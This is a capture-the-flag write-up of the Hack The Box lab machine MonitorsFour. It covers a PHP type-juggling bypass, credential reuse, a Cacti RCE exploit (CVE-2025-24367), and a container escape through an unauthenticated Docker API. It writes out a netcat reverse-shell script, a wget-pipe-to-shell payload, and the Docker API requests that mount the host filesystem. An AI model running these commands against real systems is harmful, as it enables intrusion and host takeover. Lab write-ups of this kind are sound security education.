# MonitorsFour: Hack The Box Writeup

**Machine:** MonitorsFour  
**OS:** Windows (WSL2 + Docker)  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

MonitorsFour is a machine with a layered architecture: a Windows host running Docker containers via WSL2. The attack chain starts with directory enumeration exposing a `.env` file with database credentials, progresses through a PHP type juggling vulnerability to dump the user table, cracks an MD5 hash and reuses the password to access Cacti, then exploits CVE-2025-24367 for authenticated RCE inside a Docker container. Privilege escalation and container escape are achieved by pivoting to an unauthenticated Docker API exposed on the WSL2 host interface, spawning a new container with the host filesystem mounted, and reading the root flag directly from the Windows filesystem.

**Key techniques:** Directory enumeration · Exposed `.env` file · PHP type juggling (loose comparison) · MD5 hash cracking · Credential reuse · CVE-2025-24367 (Cacti authenticated RCE) · Docker API abuse · Container escape · WSL2/Windows filesystem traversal

---

## Reconnaissance

Full port scan takes too long (default range first, then expanded):

```bash
sudo nmap -sV -sC -T4 10.129.14.163
```

**Results:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx: redirects to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two services: an nginx web server and port 5985 (WinRM). The HTTP service redirects to `monitorsfour.htb`, so add it to the hosts file:

```bash
sudo vi /etc/hosts
# Add: 10.129.14.163  monitorsfour.htb
```

---

## Enumeration

### Directory Enumeration: Main Application

```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Results:**

```
/.env                 (Status: 200) [Size: 97]
/contact              (Status: 200) [Size: 367]
/controllers          (Status: 301)
/forgot-password      (Status: 200) [Size: 3099]
/login                (Status: 200) [Size: 4340]
/static               (Status: 301)
/user                 (Status: 200) [Size: 35]
/views                (Status: 301)
```

Several interesting endpoints, but the immediately critical one is `/.env`.

### Exposed .env File

```bash
curl http://monitorsfour.htb/.env
```

A downloadable file called `Untitled.env` contains:

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

Database credentials exposed in plaintext. Port 3306 is filtered externally so direct MySQL access isn't possible, but these credentials are saved for later use.

### API Enumeration

The `/user` endpoint returns `{"error":"Missing token parameter"}`, suggesting a token-based API. Fuzzing the API reveals more endpoints:

```bash
ffuf -u http://monitorsfour.htb/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
```

```
auth     (Status: 405)
logout   (Status: 302)
user     (Status: 200)
users    (Status: 200)
```

The `/forgot-password` page POSTs to `/api/v1/reset` and accepts an email parameter. The footer of the main page reveals the email `sales@monitorsfour.htb`. Testing the reset endpoint with form-encoded data and watching the redirect destination reveals it as a valid account.

### Vhost Enumeration

```bash
ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3
```

```
cacti   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
```

Navigating to `http://cacti.monitorsfour.htb/cacti/` reveals **Cacti version 1.2.28**.

---

## Initial Access

### PHP Type Juggling: User Table Dump

The `/user?token=` endpoint is the password reset link destination. The backend compares the submitted token against a stored value using PHP's loose `==` operator instead of strict `===`. This is a critical distinction.

When PHP performs a loose comparison between a string that starts with letters (like a hex token `"a3f9b2c1..."`) and a numeric value like `"0"`, it converts both to integers. The hex string converts to `0`, and `"0"` also converts to `0`, so the comparison evaluates to `TRUE`: even though the values are completely different.

```php
// What the backend does:
if ($stored_token == $user_token) { ... }   // loose ==

// What happens:
"a3f9b2c1..." == "0"
// PHP converts both to int: 0 == 0 → TRUE
```

First, trigger a password reset to ensure a token is live in the database:

```bash
curl -s -X POST http://monitorsfour.htb/api/v1/reset -d 'email=sales@monitorsfour.htb'
```

Then fuzz the token parameter with a type juggling wordlist:

```bash
ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" -w php_loose_comparison.txt -fw 4
```

```
0            [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 48ms]
0e807097     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 49ms]
0e1          [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 70ms]
```

Visiting `http://monitorsfour.htb/user?token=0` dumps the entire user table as JSON: the bypass matched every user whose token was a magic hash (`0e...` strings that PHP evaluates as float zero):

```json
[
  {"id":2,"username":"admin","email":"admin@monitorsfour.htb",
   "password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",
   "name":"Marcus Higgins",...},
  {"id":5,"username":"mwatson","token":"0e543210987654321",...},
  {"id":6,"username":"janderson","token":"0e999999999999999",...},
  {"id":7,"username":"dthompson","token":"0e111111111111111",...}
]
```

The tokens for mwatson, janderson, and dthompson were all intentionally set to magic hashes: part of the machine design. The admin token was a real random hex value, but his MD5 password hash is crackable.

### Hash Cracking

The admin MD5 hash `56b32eb43e6f15395f6c46c1c9e1cd36` cracks via CrackStation:

```
56b32eb43e6f15395f6c46c1c9e1cd36 → wonderful1
```

### Credential Reuse: Cacti Login

Logging into `http://monitorsfour.htb/login` as `admin / wonderful1` succeeds. More importantly, the user table revealed the admin's real name: **Marcus Higgins**. Testing credential reuse against Cacti with the username `marcus` and the same password:

```
http://cacti.monitorsfour.htb/cacti/
Username: marcus
Password: wonderful1
```

Login successful. Cacti 1.2.28 is vulnerable to **CVE-2025-24367**: an authenticated RCE via malicious graph template import.

### CVE-2025-24367: Remote Code Execution

Using the public PoC for CVE-2025-24367:

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
cd CVE-2025-24367-Cacti-PoC
python3 -m venv venv
source venv/bin/activate
pip install requests beautifulsoup4
```

Set up a listener:

```bash
nc -lvnp 4001
```

Run the exploit:

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.12 -l 4001 -url http://cacti.monitorsfour.htb
```

```
[+] Cacti Instance Found!
[+] Login Successful!
[+] The target is vulnerable.
[+] Hit timeout, looks good for shell, check your listener!
```

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.14.163] 50595
www-data@821fbd6a43fa:~/html/cacti$
```

Shell obtained as `www-data`. The hostname `821fbd6a43fa` is a Docker container ID: confirming we're inside a container, not on the host.

```bash
cat /home/marcus/user.txt
# 1238088823d5160142f352563b845551
```

---

## Container Enumeration

Standard checks confirm the container environment:

```bash
cat /proc/1/cgroup        # confirms Docker overlay filesystem
ip route                  # default via 172.18.0.1: host gateway
cat /etc/resolv.conf      # reveals 192.168.65.7: Docker Desktop WSL2 interface
```

Key finding: the container has no capabilities, no docker socket, and no privilege escalation path directly. However the network reveals two gateways:

- `172.18.0.1`: Docker bridge (host internal)
- `192.168.65.7`: Docker Desktop host network interface

Scanning ports on `192.168.65.7` using bash's built-in TCP device:

```bash
for port in $(seq 1 3000); do
  (echo >/dev/tcp/192.168.65.7/$port) 2>/dev/null && echo "$port open"
done
```

```
53 open
2375 open
```

**Port 2375 is the Docker daemon API: exposed without authentication.**

### Cacti Config: Additional Credentials

```bash
cat /var/www/html/cacti/include/config.php
```

```php
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
```

---

## Privilege Escalation: Docker API Container Escape

The Docker daemon API on port 2375 requires no authentication: any HTTP client can create, start, and interact with containers. The plan is to spawn a new container using an existing image with the host filesystem mounted inside it.

List available images:

```bash
curl -s http://192.168.65.7:2375/images/json
```

Three images are available: `docker_setup-nginx-php`, `docker_setup-mariadb`, and `alpine:latest`. Alpine is ideal: minimal and has the tools needed.

### Spawning a Container with Host Filesystem Mounted

Create a new Alpine container that mounts the host root `/` into `/mnt/root` and executes a reverse shell:

**On Kali: prepare the shell script:**

```bash
echo '#!/bin/sh' > /tmp/shell.sh
echo 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.12 4444 > /tmp/f' >> /tmp/shell.sh
python3 -m http.server 8000
```

**On Kali: start listener:**

```bash
nc -lvnp 4444
```

**In the container shell: create and start the malicious container:**

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","wget -qO- http://10.10.15.12:8000/shell.sh | sh"],"HostConfig":{"Binds":["/:/mnt/root:rw"]}}'

# Returns: {"Id":"12bae8375ffd...","Warnings":[]}

curl -s -X POST http://192.168.65.7:2375/containers/12bae8375ffd.../start
```

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.14.163] 50603
/bin/sh: can't access tty; job control turned off
/ # whoami
root
```

Root shell inside the new Alpine container. The host filesystem is mounted at `/mnt/root`. The kernel version (`6.6.87.2-microsoft-standard-WSL2`) confirms this is WSL2: meaning the Windows C: drive is accessible via the WSL2 mount path:

```bash
cat /mnt/root/mnt/host/c/Users/Administrator/Desktop/root.txt
# 29f38f1d37a590fbf86e7b7e902a8b84
```
---

<img width="1197" height="687" alt="Screenshot 2026-04-28 103701" src="https://github.com/user-attachments/assets/7ec13424-4c9c-47b1-8191-3ec052ede7f0" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Exposed `.env` file | `/.env` on main app | Database credentials in cleartext |
| PHP type juggling (loose `==`) | `/user?token=` endpoint | Authentication bypass → full user table dump |
| Weak MD5 hash | `admin` password hash | Crackable offline → plaintext password |
| Credential reuse | Main app → Cacti | `marcus / wonderful1` works across both apps |
| CVE-2025-24367 | Cacti 1.2.28 | Authenticated RCE via graph template import |
| Unauthenticated Docker API | Port 2375 on WSL2 interface | Full container escape → host filesystem access |
| Host filesystem mount | Docker container creation | Read/write access to Windows C: drive |

---

## Key Takeaways

- **Never expose `.env` files**: web servers must be configured to deny access to dotfiles. A single misconfiguration hands attackers database credentials before they've even tried to attack the application
- **PHP type juggling is subtle but devastating**: a single `==` where `===` should be used turns an authentication endpoint into a full data dump. Always use strict comparison for security checks
- **Credential reuse is reliable**: `marcus / wonderful1` worked on two completely separate applications. People reuse passwords, always test across every available service
- **Magic hash tokens are not random**: the intentional `0e...` tokens in the database were the machine's hint that type juggling was the intended path. In real engagements, predictable or weak tokens are a common finding
- **The Docker API on port 2375 should never be exposed**: it is effectively root access to the host. If Docker needs remote access, it must use TLS mutual authentication on port 2376
- **WSL2 + Docker creates complex attack surfaces**: the layered architecture (Windows → WSL2 → Docker) introduced multiple network interfaces and mount paths that wouldn't exist in a simpler setup. Understanding the network topology was essential to finding the escape path
- **Container escapes often go through misconfigurations, not kernel exploits**: no CVE was needed here. An exposed API and a `Binds` parameter were enough

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
